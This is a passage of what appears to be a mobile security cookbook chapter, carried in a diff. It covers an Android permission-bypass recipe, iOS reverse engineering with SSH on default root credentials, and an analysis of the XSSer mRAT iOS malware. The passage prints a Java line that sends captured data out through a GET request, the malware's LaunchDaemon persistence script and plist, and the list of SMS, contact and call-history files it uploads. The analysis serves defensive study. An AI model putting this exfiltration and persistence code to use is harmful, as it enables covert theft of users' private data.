+  // Waits for the command to finish. &#13;
+  try { &#13;
+    process.waitFor(); &#13;
+  } catch (InterruptedException e) { &#13;
+    // TODO Auto-generated catch block &#13;
+    //e.printStackTrace(); &#13;
+  } &#13;
+  String data = output.toString(); &#13;
+</pre><p>Finally, we send the captured data to the server via the GET method:</p><pre class="programlisting">startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("http://10.0.2.2/input.php?input=" + data))); &#13;
+</pre></div><div class="section" title="There's more..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec63"/>There's more...</h2></div></div></div><p>There is more to explore in the area of Android permission bypassing, gaining root privileges, and extending permissions. Refer to the link mentioned in the <span class="emphasis"><em>See also</em></span> section.</p></div><div class="section" title="See also"><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec64"/>See also</h2></div></div></div><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc"><a class="ulink" href="https://hackinparis.com/data/slides/2012/Georgia-androidpermissions.pdf">https://hackinparis.com/data/slides/2012/Georgia-androidpermissions.pdf</a></li></ul></div></div></div>
+<div class="section" title="Reverse engineering iOS applications"><div class="titlepage"><div><div><h1 class="title"><a id="ch02lvl1sec24"/>Reverse engineering iOS applications</h1></div></div></div><p>In this recipe, we will learn how to perform reverse engineering on the iOS platform.</p><div class="section" title="Getting ready"><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec65"/>Getting ready</h2></div></div></div><p>The target device needs to be jailbroken for a smooth reverse engineering  activity.</p><p>Install <span class="strong"><strong>i-Funbox</strong></span> on your machine from 
+<a class="ulink" href="http://www.i-funbox.com">www.i-funbox.com</a>
+. i-Funbox is an app management tool for iPhone, iPad, and iPod Touch. We will use this tool for device and application analysis.</p><p>Download the class_dump_z tool from https://code.google.com/p/networkpx/wiki/class_dump_z.</p></div><div class="section" title="How to do it..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec66"/>How to do it...</h2></div></div></div><p>The following steps help you perform reverse engineering on the iOS platform:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Connect the jaibroken device to your workstation using a USB cable.</li><li class="listitem">Open the i-Funbox application. This is what the interface should look like:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_019.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">Let's install a malware app on our device and explore it through i-Funbox.</li><li class="listitem">Locate the malware in your machine's filesystem.</li><li class="listitem">In the left-hand panel of i-Funbox, click on <span class="strong"><strong>Cydia App Install</strong></span>. A blank area appears in the center of the screen:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_020.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">Now, drag and drop the malware into the blank area:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_021.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">To complete the installation, just reboot the device. That's it! The malware is installed and ready for analysis.</li><li class="listitem">Now unpack the <code class="literal">.deb</code> file to view the content of the package. The unpacked directory contains a file called <code class="literal">data.tar</code>, which can be further unpacked to the <code class="literal">data</code> directory.<p>We now explore further, to <code class="literal">/data/bin</code>, where we find three files:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">com.xsser.0day.iphone.plist</li><li class="listitem" style="list-style-type: disc">xsser.0day_t</li><li class="listitem" style="list-style-type: disc">xsser.0day_t.sh</li></ul></div></li><li class="listitem">In i-Funbox, click on <span class="strong"><strong>Raw File System</strong></span>:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_022.jpg" alt="How to do it..."/></div><p>
+</p><p>Since we know that one of the files is a shell file, let's see if the file has been installed as a binary on the device.</p></li><li class="listitem">Navigate to the <code class="literal">bin</code> directory. We see that the shell file is, in fact, in the bin directory, along with the other files identified earlier as well. Jailbroken devices have an SSH server listening by default, with the user as <code class="literal">root</code> and the password as <code class="literal">alpine</code>.</li><li class="listitem">From the command prompt/terminal, issue the following command:<pre class="programlisting">
+<span class="strong"><strong>ssh root@&lt;ip_of_device&gt;</strong></span>
+</pre></li><li class="listitem">When prompted for a password, enter <code class="literal">alpine</code>. One of the most important requirements is to be able to view the source code of an iOS application. This can be achieved with a tool called <code class="literal">class_dump-z</code>.</li><li class="listitem">Navigate to the directory where <code class="literal">class_dump_z</code> is located.</li><li class="listitem">Let's use a preinstalled app for this purpose.</li><li class="listitem">Using i-Funbox, navigate to the application directory, click on <span class="strong"><strong>Contacts~iphone</strong></span>, and then click on <span class="strong"><strong>Copy to PC</strong></span>. Select the destination directory on your machine, and click on <span class="strong"><strong>Save</strong></span>:<p>
+</p><div class="mediaobject"><img src="graphics/image_02_023.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">Now let's dump the classes from this app. Navigate to <code class="literal">class_dump_z</code> directory, and execute the following command:</li></ol></div><pre class="programlisting">
+<span class="strong"><strong>class-dump-z.exe "C:\Akshay\output\ios\Contacts~iphone.app\Contacts~iphone" &gt; Contacts-class_dump.txt </strong></span>
+</pre><p>Your output should look like the following:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_024.jpg" alt="How to do it..."/></div><p>
+</p><p>We now have a dump of all classes, methods, and related relevant information for our analysis.</p><p>The following snippet reveals a class named <code class="literal">SearchRequestHistoryItem</code>, which is inheriting from <code class="literal">PersistentSearchRequestHistoryItem</code>:</p><pre class="programlisting">@interface SearchRequestHistoryItem : PersistentSearchRequestHistoryItem &lt;HistoryItem&gt; { &#13;
+} &#13;
+@property(readonly, assign, nonatomic) BOOL hasMultipleLocations; &#13;
+-(id)displayQuery; &#13;
+-(int)type; &#13;
+-(unsigned)hash; &#13;
+-(BOOL)isEqual:(id)equal; &#13;
+-(id)initWithRequest:(id)request displayQuery:(id)query location:(id)location hasMultipleLocations:(BOOL)locations; &#13;
+-(id)initWithRequest:(id)request displayQuery:(id)query location:(id)location; &#13;
+@end &#13;
+</pre></div><div class="section" title="How it works..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec67"/>How it works...</h2></div></div></div><p>Malware is known to create executable files, which are added to system directories and provide executable permissions.</p><p>These executables in turn add property files, try to access and control launch daemons, read sensitive data, and even attempt to upload sensitive data to remote servers.</p></div></div>
+<div class="section" title="Analyzing malware in the iOS environment"><div class="titlepage"><div><div><h1 class="title"><a id="ch02lvl1sec25"/>Analyzing malware in the iOS environment</h1></div></div></div><p>We will take a look at the XSSer mRAT iOS malware sample, for our preliminary analysis. If installed, this malware operates in the background of a victim's phone, and the contents of the targeted device are sent to remote servers that appear to be controlled by a foreign government or organization. XSSer mRAT can steal SMS messages, call logs, location data, photos, address books, data from the Chinese messaging application Tencent, and passwords from the iOS keychain.</p><div class="section" title="Getting ready"><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec68"/>Getting ready</h2></div></div></div><p>We need unzipping utilities such as 7-Zip, WinZip, and so on.</p></div><div class="section" title="How to do it..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec69"/>How to do it...</h2></div></div></div><p>To analyze malware in the iOS environment perform the following steps:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">We unpack the <code class="literal">.deb</code> file to view the contents of the package. The unpacked directory contains a file called <code class="literal">data.tar</code>, which can be further unpacked to the <code class="literal">data</code> directory.</li><li class="listitem">We now explore further, to /data/bin, where we find three files:<div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">com.xsser.0day.iphone.plist</li><li class="listitem" style="list-style-type: disc">xsser.0day_t</li><li class="listitem" style="list-style-type: disc">xsser.0day_t.sh</li></ul></div></li><li class="listitem">Let's have a look at the <code class="literal">xxser.0day_t.sh</code> file. The following code is revealed:<pre class="programlisting">#!/bin/sh&#13;
+cp /bin/xsser.0day_t /bin/xsser.0day&#13;
+cp /bin/com.xsser.0day.iphone.plist /Library/LaunchDaemons/com.xsser.0day.iphone.plist&#13;
+chmod -R 0755 /bin/xsser.0day&#13;
+chmod -R 0755 /Library/LaunchDaemons/com.xsser.0day.iphone.plist&#13;
+chown root /Library/LaunchDaemons/com.xsser.0day.iphone.plist&#13;
+launchctl load /Library/LaunchDaemons/com.xsser.0day.iphone.plist&#13;
+</pre><p>Code analysis reveals that the app attempts to copy the binary package <code class="literal">xsser.0day_t</code> to the device's <code class="literal">/bin</code> directory, which indicates that the binary file is used to carry out malicious commands.</p><p>The next line reveals that the malware copies the plist file to the <code class="literal">/Library/LaunchDaemons</code> directory to launch the App code at system startup and reboot.</p><p>We also see that permission of <code class="literal">755</code> has been granted to both files using <code class="literal">chmod 0755</code>, which allows everyone to read and execute the file, and the file owner to write to the file with the following code:</p><pre class="programlisting">
+<span class="strong"><strong>chown root /Library/LaunchDaemons/com.xsser.0day.iphone.plist</strong></span>
+<span class="strong"><strong>launchctl load /Library/LaunchDaemons/com.xsser.0day.iphone.plist</strong></span>
+</pre></li><li class="listitem">The app now uses <code class="literal">launchctl</code> to interface with <code class="literal">launchd</code> in order to load <code class="literal">daemons/agents</code> and generally control <code class="literal">launchd</code> via its <code class="literal">plist</code> file.</li><li class="listitem">Let's have a look at the plist file. Open the plist file in Notepad. The contents are as follows:<pre class="programlisting">&lt;plist version="1.0"&gt; &#13;
+&lt;dict&gt;  &#13;
+  &lt;key&gt;KeepAlive&lt;/key&gt; &#13;
+  &lt;true/&gt; &#13;
+  &lt;key&gt;Label&lt;/key&gt; &#13;
+  &lt;string&gt;com.xsser.0day.iphone&lt;/string&gt; &#13;
+  &lt;key&gt;Program&lt;/key&gt;  &#13;
+  &lt;string&gt;/bin/xsser.0day&lt;/string&gt; &#13;
+  &lt;key&gt;RunAtLoad&lt;/key&gt; &#13;
+  &lt;true/&gt; &#13;
+&lt;/dict&gt; &#13;
+&lt;/plist&gt; &#13;
+</pre><p>This plist file defines the <code class="literal">xsser.0day</code> binary as a program that has the capability to be started by launch daemons.</p></li><li class="listitem">This process essentially installs a native service and loads it.<p>
+</p><div class="mediaobject"><img src="graphics/image_02_025.jpg" alt="How to do it..."/></div><p>
+</p></li><li class="listitem">When the application is running, it sends an HTTP GET request to <a class="ulink" href="http://www.xsser.com/CheckLibrary.aspx">www.xsser.com/CheckLibrary.aspx</a> to get the library version.</li></ol></div></div><div class="section" title="How it works..."><div class="titlepage"><div><div><h2 class="title"><a id="ch02lvl2sec70"/>How it works...</h2></div></div></div><p>When the app runs at bootup, the binary checks the version of the library and saves it to a file named <code class="literal">/bin/iVersion</code>. If the version doesn't match, then it downloads and updates the iLib version. The main binary also has some minimal logging to <code class="literal">/bin/debuglogFile.log</code>.</p><p>The app then sends data such as the OS version, Mac address, device version, phone number, IMSI, and IMEI code via a GET request.</p><p>The server responds to the GET request, with a set of commands to be executed on the device. These commands include uploading the following files:</p><pre class="programlisting">
+<span class="strong"><strong>/var/mobile/Library/AddressBook/AddressBook.sqlitedb</strong></span>
+<span class="strong"><strong>/var/mobile/Library/AddressBook/AddressBook.sqlitedb-shm</strong></span>
+<span class="strong"><strong>/var/mobile/Library/AddressBook/AddressBook.sqlitedb-wal</strong></span>
+<span class="strong"><strong>/var/mobile/Library/SMS/sms.db</strong></span>
+<span class="strong"><strong>/var/mobile/Library/SMS/sms.db-shm</strong></span>
+<span class="strong"><strong>/var/mobile/Library/SMS/sms.db-wal</strong></span>
+<span class="strong"><strong>/var/wireless/Library/CallHistory/call_history.db</strong></span>
+</pre><p>All images are in the <code class="literal">/private/var/mobile/Media/DCIM/100APPLE/</code> directory. Additionally, GPS information and Keychain are also accessed by the application.</p><p>All the data is then uploaded to http://xsser.com/TargetUploadGPS.aspx:</p><p>
+</p><div class="mediaobject"><img src="graphics/image_02_026.jpg" alt="How it works..."/></div><p>
+</p></div></div></body></html>
